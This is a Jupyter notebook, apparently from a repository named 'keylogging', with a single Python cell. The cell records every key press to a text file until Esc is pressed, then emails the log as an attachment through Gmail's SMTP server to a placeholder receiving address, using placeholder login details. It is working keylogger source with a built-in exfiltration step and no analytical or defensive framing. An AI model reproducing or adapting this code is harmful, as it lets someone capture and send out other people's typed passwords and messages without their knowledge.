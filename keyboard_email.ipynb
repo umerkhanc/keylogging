{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "764e6c1d",
   "metadata": {},
   "outputs": [],
   "source": [
    "import keyboard\n",
    "import smtplib\n",
    "from email.mime.text import MIMEText\n",
    "from email.mime.multipart import MIMEMultipart\n",
    "from email.mime.application import MIMEApplication\n",
    "\n",
    "def on_press(key):\n",
    "    with open(\"typing_log.txt\", \"a\") as file:\n",
    "        file.write(key.name)\n",
    "\n",
    "keyboard.on_press(on_press)\n",
    "\n",
    "print(\"Recording started. Press 'esc' to stop.\")\n",
    "keyboard.wait('esc')\n",
    "print(\"Recording stopped.\")\n",
    "\n",
    "# Send the text file as an attachment\n",
    "\n",
    "sender_email = \"sender_email@example.com\"\n",
    "receiver_email = \"receiver_email@example.com\"\n",
    "password = \"sender_email_password\"\n",
    "\n",
    "message = MIMEMultipart()\n",
    "message[\"From\"] = sender_email\n",
    "message[\"To\"] = receiver_email\n",
    "message[\"Subject\"] = \"Keyboard Typing Log\"\n",
    "\n",
    "# Open the text file in bynary\n",
    "with open(\"typing_log.txt\", \"rb\") as file:\n",
    "    data = file.read()\n",
    "\n",
    "# Add file as application/octet-stream\n",
    "file_name = \"typing_log.txt\"\n",
    "attachment = MIMEApplication(data, _subtype = \"txt\", _encoder=lambda x:x)\n",
    "attachment.add_header('content-disposition', 'attachment', filename=file_name)\n",
    "message.attach(attachment)\n",
    "\n",
    "# Connect to the server and send email\n",
    "with smtplib.SMTP_SSL(\"smtp.gmail.com\", 465) as server:\n",
    "    server.login(sender_email, password)\n",
    "    server.sendmail(sender_email, receiver_email, message.as_string())\n",
    "\n",
    "print(\"Text file sent as an attachment to the email.\")\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.10"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
